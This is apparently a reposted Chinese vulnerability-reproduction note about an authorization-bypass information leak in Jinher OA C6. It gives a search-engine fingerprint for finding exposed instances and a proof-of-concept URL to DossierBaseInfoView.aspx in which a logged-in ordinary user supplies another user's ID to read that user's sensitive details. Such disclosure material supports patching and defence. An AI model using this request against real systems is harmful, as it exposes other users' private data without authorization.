---
title: "金和OA C6 DossierBaseInfoView.aspx 后台越权信息泄露漏洞"
date: 2026-10-17 09:13:48
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "金和OA"
tags:
  - "金和OA"
  - "信息泄露"
  - "越权"
  - "漏洞复现"
---
## 漏洞描述

金和OA C6 存在越权信息泄露漏洞，普通用户登录后可以通过遍历ID编号获取管理员及其他用户的敏感信息

## 漏洞影响

```
金和OA C6
```

## 网络测绘

```
app="Jinher-OA"
```

## 漏洞复现

使用普通用户登录 OA应用后台

访问的POC为

```plain
http://xxx.xxx.xxx.xxx/C6/JHSoft.Web.Dossier/DossierBaseInfoView.aspx?CollID=1&UserID=RY120330
```

- 注意 RY120330 需要为确定的其他的用户编号

![1](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202202090135010.png)

泄露了部分的敏感信息

## 参考文章

https://mp.weixin.qq.com/s/gwHQVIZeMWfT8a5lBX_4WA

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E9%87%91%E5%92%8COA-C6-DossierBaseInfoView.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md)
